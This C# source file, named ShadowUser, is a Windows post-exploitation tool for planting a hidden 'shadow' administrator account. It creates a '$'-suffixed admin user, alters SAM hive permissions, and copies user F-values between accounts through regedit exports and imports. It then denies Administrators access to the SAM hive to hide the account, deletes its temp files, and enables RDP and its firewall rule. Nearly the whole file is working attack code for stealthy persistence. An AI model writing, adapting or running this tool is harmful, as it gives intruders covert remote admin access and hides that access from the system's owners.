using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Security.AccessControl;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace ShadowUser
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("[!] Default password: 10 random characters. Do not change it!");
                Console.WriteLine("\nUsage: ShadowUser.exe <TargetUser> <CloneUser>");
                Console.WriteLine("   Eg: ShadowUser.exe zhangsan administrator");
                return;
            }

            string targetUser = args[0];
            string cloneUser = args[1];
            string hiddenUser = targetUser + "$";

            string password = GenerateRandomString(10);
            string tempId = GenerateRandomString(6); // used to name temp files

            try
            {
                Console.WriteLine("[*] Creating temporary hidden user...");
                CreateUser(hiddenUser, password);

                Console.WriteLine("[*] Granting SYSTEM full access to SAM hive...");
                GrantSystemFullAccessToSam();

                Console.WriteLine("[*] Exporting registry entries for target and clone users...");
                ExportUserNameKey(targetUser, tempId);
                ExportUserNameKey(cloneUser, tempId);

                Console.WriteLine("[*] Cloning F-value from target to clone user...");
                CloneUserFValue(tempId);

                Console.WriteLine("[*] Removing temporary hidden user...");
                DeleteUser(hiddenUser);

                Console.WriteLine("[*] Restoring registry entries...");
                ImportRegistryFiles(hiddenUser);

                Console.WriteLine("[*] Denying Administrators access to SAM hive...");
                DenyAdministratorsAccessToSam();

                Console.WriteLine("[*] Cleaning up temporary files...");
                CleanupTempFiles(tempId, hiddenUser, cloneUser);

                Console.WriteLine("[*] Checking/enabling RDP...");
                EnsureRdpEnabled();

                Console.WriteLine("[*] Shadow user created successfully.");
                Console.WriteLine($"[+] Clone user: {cloneUser}");
                Console.WriteLine($"[+] Hidden user: {hiddenUser}");
                Console.WriteLine($"[+] Password: {password}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
                // Attempt cleanup if possible
                try { DeleteUser(hiddenUser); } catch { }
                try { CleanupTempFiles(tempId, hiddenUser, cloneUser); } catch { }
                Environment.Exit(1);
            }
        }

        static string GenerateRandomString(int length)
        {
            const string chars = "!@#$%0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            var random = new Random();
            var buffer = new char[length];
            for (int i = 0; i < length; i++)
            {
                buffer[i] = chars[random.Next(chars.Length)];
            }
            return new string(buffer);
        }

        static void CreateUser(string username, string password)
        {
            using (var machine = new DirectoryEntry($"WinNT://{Environment.MachineName},computer"))
            using (var newUser = machine.Children.Add(username, "user"))
            {
                newUser.Invoke("SetPassword", password);
                newUser.CommitChanges();

                using (var admins = machine.Children.Find("Administrators", "group"))
                {
                    admins.Invoke("Add", newUser.Path.ToString());
                }
            }
        }

        static void DeleteUser(string username)
        {
            using (var machine = new DirectoryEntry($"WinNT://{Environment.MachineName},computer"))
            {
                try
                {
                    var user = machine.Children.Find(username, "user");
                    machine.Children.Remove(user);
                }
                catch (Exception ex)
                {
                    throw new Exception($"Failed to delete user '{username}': {ex.Message}");
                }
            }
        }

        static void GrantSystemFullAccessToSam()
        {
            using (var key = Registry.LocalMachine.OpenSubKey(@"SAM\SAM", 
                     RegistryKeyPermissionCheck.ReadWriteSubTree, 
                     RegistryRights.ChangePermissions))
            {
                if (key == null)
                    throw new Exception("Failed to open SAM hive with required permissions.");

                var security = new RegistrySecurity();
                var rule = new RegistryAccessRule("SYSTEM", 
                                                  RegistryRights.FullControl, 
                                                  AccessControlType.Allow);
                security.AddAccessRule(rule);
                key.SetAccessControl(security);
            }
        }

        static void DenyAdministratorsAccessToSam()
        {
            using (var key = Registry.LocalMachine.OpenSubKey(@"SAM\SAM", 
                     RegistryKeyPermissionCheck.ReadWriteSubTree, 
                     RegistryRights.ChangePermissions))
            {
                if (key == null)
                    throw new Exception("Failed to open SAM hive for ACL update.");

                var security = new RegistrySecurity();
                var rule = new RegistryAccessRule("Administrators", 
                                                  RegistryRights.FullControl, 
                                                  AccessControlType.Deny);
                security.AddAccessRule(rule);
                key.SetAccessControl(security);
            }
        }

        static void ExportUserNameKey(string username, string tempId)
        {
            string regPath = $@"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\{username}";
            string tempFile = $@"C:\Windows\Temp\{username}.reg";

            using (var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "regedit.exe",
                Arguments = $"/e \"{tempFile}\" \"{regPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            }))
            {
                proc?.WaitForExit();
            }

            if (!File.Exists(tempFile))
                throw new Exception($"Failed to export registry key for user: {username}");

            string content = File.ReadAllText(tempFile);
            var match = Regex.Match(content, @"(?is)(?<=\()(.*)(?=\))");
            if (!match.Success)
                throw new Exception($"Could not extract RID for user: {username}");

            string ridLine = "00000" + match.Value + Environment.NewLine;
            File.AppendAllText($@"C:\Windows\Temp\{tempId}.txt", ridLine);
        }

        static void CloneUserFValue(string tempId)
        {
            string tempFile = $@"C:\Windows\Temp\{tempId}.txt";
            string[] lines = File.ReadAllLines(tempFile);
            if (lines.Length < 2)
                throw new Exception("Insufficient data in temp file for cloning.");

            string sourceRid = lines[0].Trim();
            string targetRid = lines[1].Trim();

            using (var baseKey = Registry.LocalMachine)
            using (var sourceKey = baseKey.OpenSubKey($@"SAM\SAM\Domains\Account\Users\{sourceRid}", true))
            using (var targetKey = baseKey.OpenSubKey($@"SAM\SAM\Domains\Account\Users\{targetRid}", true))
            {
                if (sourceKey == null || targetKey == null)
                    throw new Exception("Could not open user registry keys for F-value cloning.");

                byte[] fValue = (byte[])sourceKey.GetValue("F");
                targetKey.SetValue("F", fValue, RegistryValueKind.Binary);
            }

            ExportUserFKey(targetRid);
        }

        static void ExportUserFKey(string rid)
        {
            string regPath = $@"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\{rid}";
            string outputFile = @"C:\Windows\Temp\UsersF.reg";

            using (var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "regedit.exe",
                Arguments = $"/e \"{outputFile}\" \"{regPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            }))
            {
                proc?.WaitForExit();
            }

            if (!File.Exists(outputFile))
                throw new Exception("Failed to export F-value registry key.");
        }

        static void ImportRegistryFiles(string hiddenUser)
        {
            string nameFile = $@"C:\Windows\Temp\{hiddenUser}.reg";
            string fFile = @"C:\Windows\Temp\UsersF.reg";

            if (!File.Exists(nameFile) || !File.Exists(fFile))
                throw new Exception("Required registry files missing for import.");

            using (var proc1 = Process.Start("regedit.exe", $"/s \"{nameFile}\""))
            using (var proc2 = Process.Start("regedit.exe", $"/s \"{fFile}\""))
            {
                proc1?.WaitForExit();
                proc2?.WaitForExit();
            }
        }

        static void CleanupTempFiles(string tempId, string hiddenUser, string cloneUser)
        {
            string[] files =
            {
                $@"C:\Windows\Temp\{hiddenUser}.reg",
                $@"C:\Windows\Temp\{cloneUser}.reg",
                @"C:\Windows\Temp\UsersF.reg",
                $@"C:\Windows\Temp\{tempId}.txt"
            };

            foreach (string file in files)
            {
                if (File.Exists(file))
                    File.Delete(file);
            }
        }

        static void EnsureRdpEnabled()
        {
            using (var rdpKey = Registry.LocalMachine.OpenSubKey(
                @"SYSTEM\CurrentControlSet\Control\Terminal Server", true))
            {
                if (rdpKey == null)
                    throw new Exception("Could not access RDP registry key.");

                object denyValue = rdpKey.GetValue("fDenyTSConnections");
                bool isRdpDisabled = denyValue is int val && val != 0;

                if (isRdpDisabled)
                {
                    Console.WriteLine("[*] RDP is disabled. Enabling...");
                    rdpKey.SetValue("fDenyTSConnections", 0, RegistryValueKind.DWord);

                    using (var cmd = new Process())
                    {
                        cmd.StartInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            Arguments = "/c sc config termservice start= auto && netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes",
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };
                        cmd.Start();
                        cmd.WaitForExit();
                    }
                }

                using (var portKey = Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"))
                {
                    object portValue = portKey?.GetValue("PortNumber");
                    string port = (portValue is int p) ? p.ToString() : "3389";
                    Console.WriteLine($"[+] RDP is enabled on port: {port}");
                }
            }
        }
    }
}